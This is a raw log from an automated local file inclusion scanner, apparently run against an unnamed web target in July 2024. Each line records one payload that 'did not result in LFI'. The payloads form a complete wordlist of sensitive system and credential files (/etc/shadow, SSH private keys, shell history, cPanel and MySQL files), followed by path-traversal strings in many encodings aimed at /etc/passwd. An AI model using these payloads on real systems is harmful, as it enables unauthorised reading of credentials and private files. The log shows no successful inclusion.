2024-07-15 23:32:03,717 - Payload /etc/passwd did not result in LFI.
2024-07-15 23:32:04,144 - Payload /etc/shadow did not result in LFI.
2024-07-15 23:32:04,494 - Payload /etc/aliases did not result in LFI.
2024-07-15 23:32:04,816 - Payload /etc/anacrontab did not result in LFI.
2024-07-15 23:32:05,140 - Payload /etc/apache2/apache2.conf did not result in LFI.
2024-07-15 23:32:05,465 - Payload /etc/apache2/httpd.conf did not result in LFI.
2024-07-15 23:32:05,830 - Payload /etc/at.allow did not result in LFI.
2024-07-15 23:32:06,161 - Payload /etc/at.deny did not result in LFI.
2024-07-15 23:32:06,511 - Payload /etc/bashrc did not result in LFI.
2024-07-15 23:32:06,849 - Payload /etc/bootptab did not result in LFI.
2024-07-15 23:32:07,229 - Payload /etc/chrootUsers did not result in LFI.
2024-07-15 23:32:07,532 - Payload /etc/chttp.conf did not result in LFI.
2024-07-15 23:32:07,901 - Payload /etc/cron.allow did not result in LFI.
2024-07-15 23:32:08,229 - Payload /etc/cron.deny did not result in LFI.
2024-07-15 23:32:08,571 - Payload /etc/crontab did not result in LFI.
2024-07-15 23:32:08,940 - Payload /etc/cups/cupsd.conf did not result in LFI.
2024-07-15 23:32:09,285 - Payload /etc/exports did not result in LFI.
2024-07-15 23:32:09,665 - Payload /etc/fstab did not result in LFI.
2024-07-15 23:32:09,994 - Payload /etc/ftpaccess did not result in LFI.
2024-07-15 23:32:10,322 - Payload /etc/ftpchroot did not result in LFI.
2024-07-15 23:32:10,668 - Payload /etc/ftphosts did not result in LFI.
2024-07-15 23:32:11,023 - Payload /etc/groups did not result in LFI.
2024-07-15 23:32:11,338 - Payload /etc/grub.conf did not result in LFI.
2024-07-15 23:32:11,691 - Payload /etc/hosts did not result in LFI.
2024-07-15 23:32:12,001 - Payload /etc/hosts.allow did not result in LFI.
2024-07-15 23:32:12,366 - Payload /etc/hosts.deny did not result in LFI.
2024-07-15 23:32:12,684 - Payload /etc/httpd/access.conf did not result in LFI.
2024-07-15 23:32:12,974 - Payload /etc/httpd/conf/httpd.conf did not result in LFI.
2024-07-15 23:32:13,306 - Payload /etc/httpd/httpd.conf did not result in LFI.
2024-07-15 23:32:13,624 - Payload /etc/httpd/logs/access_log did not result in LFI.
2024-07-15 23:32:13,973 - Payload /etc/httpd/logs/access.log did not result in LFI.
2024-07-15 23:32:14,264 - Payload /etc/httpd/logs/error_log did not result in LFI.
2024-07-15 23:32:14,584 - Payload /etc/httpd/logs/error.log did not result in LFI.
2024-07-15 23:32:14,898 - Payload /etc/httpd/php.ini did not result in LFI.
2024-07-15 23:32:15,209 - Payload /etc/httpd/srm.conf did not result in LFI.
2024-07-15 23:32:15,567 - Payload /etc/inetd.conf did not result in LFI.
2024-07-15 23:32:15,883 - Payload /etc/inittab did not result in LFI.
2024-07-15 23:32:16,236 - Payload /etc/issue did not result in LFI.
2024-07-15 23:32:16,522 - Payload /etc/lighttpd.conf did not result in LFI.
2024-07-15 23:32:16,818 - Payload /etc/lilo.conf did not result in LFI.
2024-07-15 23:32:17,150 - Payload /etc/logrotate.d/ftp did not result in LFI.
2024-07-15 23:32:17,477 - Payload /etc/logrotate.d/proftpd did not result in LFI.
2024-07-15 23:32:17,799 - Payload /etc/logrotate.d/vsftpd.log did not result in LFI.
2024-07-15 23:32:18,127 - Payload /etc/lsb-release did not result in LFI.
2024-07-15 23:32:18,478 - Payload /etc/motd did not result in LFI.
2024-07-15 23:32:18,803 - Payload /etc/modules.conf did not result in LFI.
2024-07-15 23:32:19,096 - Payload /etc/motd did not result in LFI.
2024-07-15 23:32:19,447 - Payload /etc/mtab did not result in LFI.
2024-07-15 23:32:19,789 - Payload /etc/my.cnf did not result in LFI.
2024-07-15 23:32:20,129 - Payload /etc/my.conf did not result in LFI.
2024-07-15 23:32:20,450 - Payload /etc/mysql/my.cnf did not result in LFI.
2024-07-15 23:32:20,800 - Payload /etc/network/interfaces did not result in LFI.
2024-07-15 23:32:21,091 - Payload /etc/networks did not result in LFI.
2024-07-15 23:32:21,453 - Payload /etc/npasswd did not result in LFI.
2024-07-15 23:32:21,798 - Payload /etc/passwd did not result in LFI.
2024-07-15 23:32:22,091 - Payload /etc/php4.4/fcgi/php.ini did not result in LFI.
2024-07-15 23:32:22,458 - Payload /etc/php4/apache2/php.ini did not result in LFI.
2024-07-15 23:32:22,786 - Payload /etc/php4/apache/php.ini did not result in LFI.
2024-07-15 23:32:23,126 - Payload /etc/php4/cgi/php.ini did not result in LFI.
2024-07-15 23:32:23,490 - Payload /etc/php4/apache2/php.ini did not result in LFI.
2024-07-15 23:32:23,835 - Payload /etc/php5/apache2/php.ini did not result in LFI.
2024-07-15 23:32:24,169 - Payload /etc/php5/apache/php.ini did not result in LFI.
2024-07-15 23:32:24,554 - Payload /etc/php/apache2/php.ini did not result in LFI.
2024-07-15 23:32:24,883 - Payload /etc/php/apache/php.ini did not result in LFI.
2024-07-15 23:32:25,168 - Payload /etc/php/cgi/php.ini did not result in LFI.
2024-07-15 23:32:25,533 - Payload /etc/php.ini did not result in LFI.
2024-07-15 23:32:25,861 - Payload /etc/php/php4/php.ini did not result in LFI.
2024-07-15 23:32:26,188 - Payload /etc/php/php.ini did not result in LFI.
2024-07-15 23:32:26,509 - Payload /etc/printcap did not result in LFI.
2024-07-15 23:32:26,850 - Payload /etc/profile did not result in LFI.
2024-07-15 23:32:27,191 - Payload /etc/proftp.conf did not result in LFI.
2024-07-15 23:32:27,537 - Payload /etc/proftpd/proftpd.conf did not result in LFI.
2024-07-15 23:32:27,876 - Payload /etc/pure-ftpd.conf did not result in LFI.
2024-07-15 23:32:28,193 - Payload /etc/pureftpd.passwd did not result in LFI.
2024-07-15 23:32:28,543 - Payload /etc/pureftpd.pdb did not result in LFI.
2024-07-15 23:32:28,879 - Payload /etc/pure-ftpd/pure-ftpd.conf did not result in LFI.
2024-07-15 23:32:29,218 - Payload /etc/pure-ftpd/pure-ftpd.pdb did not result in LFI.
2024-07-15 23:32:29,511 - Payload /etc/pure-ftpd/putreftpd.pdb did not result in LFI.
2024-07-15 23:32:29,855 - Payload /etc/redhat-release did not result in LFI.
2024-07-15 23:32:30,205 - Payload /etc/resolv.conf did not result in LFI.
2024-07-15 23:32:30,500 - Payload /etc/samba/smb.conf did not result in LFI.
2024-07-15 23:32:30,861 - Payload /etc/snmpd.conf did not result in LFI.
2024-07-15 23:32:31,204 - Payload /etc/ssh/ssh_config did not result in LFI.
2024-07-15 23:32:31,525 - Payload /etc/ssh/sshd_config did not result in LFI.
2024-07-15 23:32:31,858 - Payload /etc/ssh/ssh_host_dsa_key did not result in LFI.
2024-07-15 23:32:32,183 - Payload /etc/ssh/ssh_host_dsa_key.pub did not result in LFI.
2024-07-15 23:32:32,481 - Payload /etc/ssh/ssh_host_key did not result in LFI.
2024-07-15 23:32:32,809 - Payload /etc/ssh/ssh_host_key.pub did not result in LFI.
2024-07-15 23:32:33,105 - Payload /etc/sysconfig/network did not result in LFI.
2024-07-15 23:32:33,428 - Payload /etc/syslog.conf did not result in LFI.
2024-07-15 23:32:33,782 - Payload /etc/termcap did not result in LFI.
2024-07-15 23:32:34,103 - Payload /etc/vhcs2/proftpd/proftpd.conf did not result in LFI.
2024-07-15 23:32:34,442 - Payload /etc/vsftpd.chroot_list did not result in LFI.
2024-07-15 23:32:34,775 - Payload /etc/vsftpd.conf did not result in LFI.
2024-07-15 23:32:35,104 - Payload /etc/vsftpd/vsftpd.conf did not result in LFI.
2024-07-15 23:32:35,463 - Payload /etc/wu-ftpd/ftpaccess did not result in LFI.
2024-07-15 23:32:35,797 - Payload /etc/wu-ftpd/ftphosts did not result in LFI.
2024-07-15 23:32:36,111 - Payload /etc/wu-ftpd/ftpusers did not result in LFI.
2024-07-15 23:32:36,473 - Payload /logs/pure-ftpd.log did not result in LFI.
2024-07-15 23:32:36,803 - Payload /logs/security_debug_log did not result in LFI.
2024-07-15 23:32:37,132 - Payload /logs/security_log did not result in LFI.
2024-07-15 23:32:37,449 - Payload /opt/lampp/etc/httpd.conf did not result in LFI.
2024-07-15 23:32:37,737 - Payload /opt/xampp/etc/php.ini did not result in LFI.
2024-07-15 23:32:38,098 - Payload /proc/cpuinfo did not result in LFI.
2024-07-15 23:32:38,463 - Payload /proc/filesystems did not result in LFI.
2024-07-15 23:32:38,803 - Payload /proc/interrupts did not result in LFI.
2024-07-15 23:32:39,166 - Payload /proc/ioports did not result in LFI.
2024-07-15 23:32:39,484 - Payload /proc/meminfo did not result in LFI.
2024-07-15 23:32:39,828 - Payload /proc/modules did not result in LFI.
2024-07-15 23:32:40,187 - Payload /proc/mounts did not result in LFI.
2024-07-15 23:32:40,481 - Payload /proc/stat did not result in LFI.
2024-07-15 23:32:40,817 - Payload /proc/swaps did not result in LFI.
2024-07-15 23:32:41,132 - Payload /proc/version did not result in LFI.
2024-07-15 23:32:41,470 - Payload /proc/self/net/arp did not result in LFI.
2024-07-15 23:32:41,819 - Payload /root/anaconda-ks.cfg did not result in LFI.
2024-07-15 23:32:42,133 - Payload /usr/etc/pure-ftpd.conf did not result in LFI.
2024-07-15 23:32:42,453 - Payload /usr/lib/php.ini did not result in LFI.
2024-07-15 23:32:42,821 - Payload /usr/lib/php/php.ini did not result in LFI.
2024-07-15 23:32:43,138 - Payload /usr/local/apache/conf/modsec.conf did not result in LFI.
2024-07-15 23:32:43,498 - Payload /usr/local/apache/conf/php.ini did not result in LFI.
2024-07-15 23:32:43,787 - Payload /usr/local/apache/log did not result in LFI.
2024-07-15 23:32:44,108 - Payload /usr/local/apache/logs did not result in LFI.
2024-07-15 23:32:44,444 - Payload /usr/local/apache/logs/access_log did not result in LFI.
2024-07-15 23:32:44,761 - Payload /usr/local/apache/logs/access.log did not result in LFI.
2024-07-15 23:32:45,126 - Payload /usr/local/apache/audit_log did not result in LFI.
2024-07-15 23:32:45,417 - Payload /usr/local/apache/error_log did not result in LFI.
2024-07-15 23:32:45,712 - Payload /usr/local/apache/error.log did not result in LFI.
2024-07-15 23:32:46,040 - Payload /usr/local/cpanel/logs did not result in LFI.
2024-07-15 23:32:46,358 - Payload /usr/local/cpanel/logs/access_log did not result in LFI.
2024-07-15 23:32:46,704 - Payload /usr/local/cpanel/logs/error_log did not result in LFI.
2024-07-15 23:32:47,001 - Payload /usr/local/cpanel/logs/license_log did not result in LFI.
2024-07-15 23:32:47,369 - Payload /usr/local/cpanel/logs/login_log did not result in LFI.
2024-07-15 23:32:47,724 - Payload /usr/local/cpanel/logs/stats_log did not result in LFI.
2024-07-15 23:32:48,058 - Payload /usr/local/etc/httpd/logs/access_log did not result in LFI.
2024-07-15 23:32:48,398 - Payload /usr/local/etc/httpd/logs/error_log did not result in LFI.
2024-07-15 23:32:48,743 - Payload /usr/local/etc/php.ini did not result in LFI.
2024-07-15 23:32:49,072 - Payload /usr/local/etc/pure-ftpd.conf did not result in LFI.
2024-07-15 23:32:49,395 - Payload /usr/local/etc/pureftpd.pdb did not result in LFI.
2024-07-15 23:32:49,743 - Payload /usr/local/lib/php.ini did not result in LFI.
2024-07-15 23:32:50,035 - Payload /usr/local/php4/httpd.conf did not result in LFI.
2024-07-15 23:32:50,388 - Payload /usr/local/php4/httpd.conf.php did not result in LFI.
2024-07-15 23:32:50,719 - Payload /usr/local/php4/lib/php.ini did not result in LFI.
2024-07-15 23:32:51,040 - Payload /usr/local/php5/httpd.conf did not result in LFI.
2024-07-15 23:32:51,362 - Payload /usr/local/php5/httpd.conf.php did not result in LFI.
2024-07-15 23:32:51,681 - Payload /usr/local/php5/lib/php.ini did not result in LFI.
2024-07-15 23:32:52,023 - Payload /usr/local/php/httpd.conf did not result in LFI.
2024-07-15 23:32:52,359 - Payload /usr/local/php/httpd.conf.ini did not result in LFI.
2024-07-15 23:32:52,685 - Payload /usr/local/php/lib/php.ini did not result in LFI.
2024-07-15 23:32:52,999 - Payload /usr/local/pureftpd/etc/pure-ftpd.conf did not result in LFI.
2024-07-15 23:32:53,340 - Payload /usr/local/pureftpd/etc/pureftpd.pdn did not result in LFI.
2024-07-15 23:32:53,695 - Payload /usr/local/pureftpd/sbin/pure-config.pl did not result in LFI.
2024-07-15 23:32:54,014 - Payload /usr/local/www/logs/httpd_log did not result in LFI.
2024-07-15 23:32:54,347 - Payload /usr/local/Zend/etc/php.ini did not result in LFI.
2024-07-15 23:32:54,717 - Payload /usr/sbin/pure-config.pl did not result in LFI.
2024-07-15 23:32:55,069 - Payload /var/adm/log/xferlog did not result in LFI.
2024-07-15 23:32:55,400 - Payload /var/apache2/config.inc did not result in LFI.
2024-07-15 23:32:55,722 - Payload /var/apache/logs/access_log did not result in LFI.
2024-07-15 23:32:56,042 - Payload /var/apache/logs/error_log did not result in LFI.
2024-07-15 23:32:56,382 - Payload /var/cpanel/cpanel.config did not result in LFI.
2024-07-15 23:32:56,758 - Payload /var/lib/mysql/my.cnf did not result in LFI.
2024-07-15 23:32:57,114 - Payload /var/lib/mysql/mysql/user.MYD did not result in LFI.
2024-07-15 23:32:57,409 - Payload /var/local/www/conf/php.ini did not result in LFI.
2024-07-15 23:32:57,786 - Payload /var/log/apache2/access_log did not result in LFI.
2024-07-15 23:32:58,152 - Payload /var/log/apache2/access.log did not result in LFI.
2024-07-15 23:32:58,466 - Payload /var/log/apache2/error_log did not result in LFI.
2024-07-15 23:32:58,810 - Payload /var/log/apache2/error.log did not result in LFI.
2024-07-15 23:32:59,140 - Payload /var/log/apache/access_log did not result in LFI.
2024-07-15 23:32:59,509 - Payload /var/log/apache/access.log did not result in LFI.
2024-07-15 23:32:59,844 - Payload /var/log/apache/error_log did not result in LFI.
2024-07-15 23:33:00,187 - Payload /var/log/apache/error.log did not result in LFI.
2024-07-15 23:33:00,510 - Payload /var/log/apache-ssl/access.log did not result in LFI.
2024-07-15 23:33:00,799 - Payload /var/log/apache-ssl/error.log did not result in LFI.
2024-07-15 23:33:01,127 - Payload /var/log/auth.log did not result in LFI.
2024-07-15 23:33:01,419 - Payload /var/log/boot did not result in LFI.
2024-07-15 23:33:01,749 - Payload /var/htmp did not result in LFI.
2024-07-15 23:33:02,102 - Payload /var/log/chttp.log did not result in LFI.
2024-07-15 23:33:02,437 - Payload /var/log/cups/error.log did not result in LFI.
2024-07-15 23:33:02,770 - Payload /var/log/daemon.log did not result in LFI.
2024-07-15 23:33:03,091 - Payload /var/log/debug did not result in LFI.
2024-07-15 23:33:03,462 - Payload /var/log/dmesg did not result in LFI.
2024-07-15 23:33:03,772 - Payload /var/log/dpkg.log did not result in LFI.
2024-07-15 23:33:04,115 - Payload /var/log/exim_mainlog did not result in LFI.
2024-07-15 23:33:04,471 - Payload /var/log/exim/mainlog did not result in LFI.
2024-07-15 23:33:04,822 - Payload /var/log/exim_paniclog did not result in LFI.
2024-07-15 23:33:05,145 - Payload /var/log/exim.paniclog did not result in LFI.
2024-07-15 23:33:05,474 - Payload /var/log/exim_rejectlog did not result in LFI.
2024-07-15 23:33:05,810 - Payload /var/log/exim/rejectlog did not result in LFI.
2024-07-15 23:33:06,174 - Payload /var/log/faillog did not result in LFI.
2024-07-15 23:33:06,511 - Payload /var/log/ftplog did not result in LFI.
2024-07-15 23:33:06,846 - Payload /var/log/ftp-proxy did not result in LFI.
2024-07-15 23:33:07,160 - Payload /var/log/ftp-proxy/ftp-proxy.log did not result in LFI.
2024-07-15 23:33:07,497 - Payload /var/log/httpd/access_log did not result in LFI.
2024-07-15 23:33:07,829 - Payload /var/log/httpd/access.log did not result in LFI.
2024-07-15 23:33:08,189 - Payload /var/log/httpd/error_log did not result in LFI.
2024-07-15 23:33:08,549 - Payload /var/log/httpd/error.log did not result in LFI.
2024-07-15 23:33:08,882 - Payload /var/log/httpsd/ssl.access_log did not result in LFI.
2024-07-15 23:33:09,219 - Payload /var/log/httpsd/ssl_log did not result in LFI.
2024-07-15 23:33:09,560 - Payload /var/log/kern.log did not result in LFI.
2024-07-15 23:33:09,932 - Payload /var/log/lastlog did not result in LFI.
2024-07-15 23:33:10,255 - Payload /var/log/lighttpd/access.log did not result in LFI.
2024-07-15 23:33:10,610 - Payload /var/log/lighttpd/error.log did not result in LFI.
2024-07-15 23:33:10,942 - Payload /var/log/lighttpd/lighttpd.access.log did not result in LFI.
2024-07-15 23:33:11,235 - Payload /var/log/lighttpd/lighttpd.error.log did not result in LFI.
2024-07-15 23:33:11,566 - Payload /var/log/mail.info did not result in LFI.
2024-07-15 23:33:11,862 - Payload /var/log/mail.log did not result in LFI.
2024-07-15 23:33:12,217 - Payload /var/log/maillog did not result in LFI.
2024-07-15 23:33:12,512 - Payload /var/log/mail.warn did not result in LFI.
2024-07-15 23:33:12,853 - Payload /var/log/message did not result in LFI.
2024-07-15 23:33:13,199 - Payload /var/log/messages did not result in LFI.
2024-07-15 23:33:13,518 - Payload /var/log/mysqlderror.log did not result in LFI.
2024-07-15 23:33:13,853 - Payload /var/log/mysql.log did not result in LFI.
2024-07-15 23:33:14,183 - Payload /var/log/mysql/mysql-bin.log did not result in LFI.
2024-07-15 23:33:14,539 - Payload /var/log/mysql/mysql.log did not result in LFI.
2024-07-15 23:33:14,874 - Payload /var/log/mysql/mysql-slow.log did not result in LFI.
2024-07-15 23:33:15,218 - Payload /var/log/proftpd did not result in LFI.
2024-07-15 23:33:15,511 - Payload /var/log/pureftpd.log did not result in LFI.
2024-07-15 23:33:15,858 - Payload /var/log/pure-ftpd/pure-ftpd.log did not result in LFI.
2024-07-15 23:33:16,184 - Payload /var/log/secure did not result in LFI.
2024-07-15 23:33:16,512 - Payload /var/log/vsftpd.log did not result in LFI.
2024-07-15 23:33:16,845 - Payload /var/log/wtmp did not result in LFI.
2024-07-15 23:33:17,178 - Payload /var/log/xferlog did not result in LFI.
2024-07-15 23:33:17,477 - Payload /var/log/yum.log did not result in LFI.
2024-07-15 23:33:17,774 - Payload /var/mysql.log did not result in LFI.
2024-07-15 23:33:18,106 - Payload /var/run/utmp did not result in LFI.
2024-07-15 23:33:18,424 - Payload /var/spool/cron/crontabs/root did not result in LFI.
2024-07-15 23:33:18,758 - Payload /var/webmin/miniserv.log did not result in LFI.
2024-07-15 23:33:19,114 - Payload /var/www/log/access_log did not result in LFI.
2024-07-15 23:33:19,484 - Payload /var/www/log/error_log did not result in LFI.
2024-07-15 23:33:19,862 - Payload /var/www/logs/access_log did not result in LFI.
2024-07-15 23:33:20,229 - Payload /var/www/logs/error_log did not result in LFI.
2024-07-15 23:33:20,557 - Payload /var/www/logs/access.log did not result in LFI.
2024-07-15 23:33:20,910 - Payload /var/www/logs/error.log did not result in LFI.
2024-07-15 23:33:21,238 - Payload ~/.atfp_history did not result in LFI.
2024-07-15 23:33:21,554 - Payload ~/.bash_history did not result in LFI.
2024-07-15 23:33:21,872 - Payload ~/.bash_logout did not result in LFI.
2024-07-15 23:33:22,207 - Payload ~/.bash_profile did not result in LFI.
2024-07-15 23:33:22,575 - Payload ~/.bashrc did not result in LFI.
2024-07-15 23:33:22,872 - Payload ~/.gtkrc did not result in LFI.
2024-07-15 23:33:23,169 - Payload ~/.login did not result in LFI.
2024-07-15 23:33:23,545 - Payload ~/.logout did not result in LFI.
2024-07-15 23:33:23,884 - Payload ~/.mysql_history did not result in LFI.
2024-07-15 23:33:24,176 - Payload ~/.nano_history did not result in LFI.
2024-07-15 23:33:24,498 - Payload ~/.php_history did not result in LFI.
2024-07-15 23:33:24,831 - Payload ~/.profile did not result in LFI.
2024-07-15 23:33:25,158 - Payload ~/.ssh/authorized_keys did not result in LFI.
2024-07-15 23:33:25,490 - Payload ~/.ssh/id_dsa did not result in LFI.
2024-07-15 23:33:25,866 - Payload ~/.ssh/id_dsa.pub did not result in LFI.
2024-07-15 23:33:26,185 - Payload ~/.ssh/id_rsa did not result in LFI.
2024-07-15 23:33:26,511 - Payload ~/.ssh/id_rsa.pub did not result in LFI.
2024-07-15 23:33:26,851 - Payload ~/.ssh/identity did not result in LFI.
2024-07-15 23:33:27,182 - Payload ~/.ssh/identity.pub did not result in LFI.
2024-07-15 23:33:27,508 - Payload ~/.viminfo did not result in LFI.
2024-07-15 23:33:27,814 - Payload ~/.wm_style did not result in LFI.
2024-07-15 23:33:28,136 - Payload ~/.Xdefaults did not result in LFI.
2024-07-15 23:33:28,431 - Payload ~/.xinitrc did not result in LFI.
2024-07-15 23:33:28,758 - Payload ~/.Xresources did not result in LFI.
2024-07-15 23:33:29,075 - Payload ~/.xsession did not result in LFI.
2024-07-15 23:33:29,427 - Payload ../ did not result in LFI.
2024-07-15 23:33:29,755 - Payload ..\ did not result in LFI.
2024-07-15 23:33:30,113 - Payload ..\/ did not result in LFI.
2024-07-15 23:33:30,449 - Payload %2e%2e%2f did not result in LFI.
2024-07-15 23:33:30,786 - Payload %252e%252e%252f did not result in LFI.
2024-07-15 23:33:31,144 - Payload %c0%ae%c0%ae%c0%af did not result in LFI.
2024-07-15 23:33:31,496 - Payload %uff0e%uff0e%u2215 did not result in LFI.
2024-07-15 23:33:31,866 - Payload %uff0e%uff0e%u2216 did not result in LFI.
2024-07-15 23:33:32,207 - Payload ..././ did not result in LFI.
2024-07-15 23:33:32,525 - Payload ...\.\ did not result in LFI.
2024-07-15 23:33:32,854 - Payload /proc/<int>/fd/<int> did not result in LFI.
2024-07-15 23:33:33,209 - Payload e.g. did not result in LFI.
2024-07-15 23:33:33,544 - Payload /proc/2116/fd/11 did not result in LFI.
2024-07-15 23:33:33,901 - Payload ..//etc/passwd did not result in LFI.
2024-07-15 23:33:34,205 - Payload ../..//etc/passwd did not result in LFI.
2024-07-15 23:33:34,494 - Payload ../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:34,863 - Payload ../../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:35,203 - Payload ../../../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:35,570 - Payload ../../../../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:35,906 - Payload ../../../../../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:36,243 - Payload ../../../../../../../..//etc/passwd did not result in LFI.
2024-07-15 23:33:36,541 - Payload ..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:36,908 - Payload ..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:37,226 - Payload ..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:37,578 - Payload ..%2f..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:37,913 - Payload ..%2f..%2f..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:38,243 - Payload ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:38,572 - Payload ..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:38,900 - Payload ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:39,232 - Payload %2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:39,543 - Payload %2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:39,910 - Payload %2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:40,201 - Payload %2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:40,587 - Payload %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:40,925 - Payload %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:41,295 - Payload %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:41,673 - Payload %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd did not result in LFI.
2024-07-15 23:33:42,001 - Payload %2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:42,351 - Payload %2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:42,708 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:43,053 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:43,386 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:43,741 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:44,063 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:44,383 - Payload %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd did not result in LFI.
2024-07-15 23:33:44,742 - Payload ..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:45,063 - Payload ..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:45,434 - Payload ..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:45,778 - Payload ..%252f..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:46,106 - Payload ..%252f..%252f..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:46,464 - Payload ..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:46,820 - Payload ..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:47,154 - Payload ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:47,477 - Payload %252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:47,842 - Payload %252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:48,163 - Payload %252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:48,528 - Payload %252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:48,822 - Payload %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:49,155 - Payload %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:49,489 - Payload %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:49,836 - Payload %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd did not result in LFI.
2024-07-15 23:33:50,176 - Payload %252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:50,522 - Payload %252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:50,860 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:51,219 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:51,532 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:51,889 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:52,179 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:52,520 - Payload %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd did not result in LFI.
2024-07-15 23:33:52,888 - Payload ..\/etc/passwd did not result in LFI.
2024-07-15 23:33:53,214 - Payload ..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:53,530 - Payload ..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:53,866 - Payload ..\..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:54,205 - Payload ..\..\..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:54,534 - Payload ..\..\..\..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:54,846 - Payload ..\..\..\..\..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:55,163 - Payload ..\..\..\..\..\..\..\..\/etc/passwd did not result in LFI.
2024-07-15 23:33:55,516 - Payload ..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:55,856 - Payload ..%255c..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:56,213 - Payload ..%255c..%255c..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:56,535 - Payload ..%255c..%255c..%255c..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:56,858 - Payload ..%255c..%255c..%255c..%255c..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:57,223 - Payload ..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd did not result in LFI.
2024-07-15 23:33:57,580 - Payload ..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd did not result in LFI.
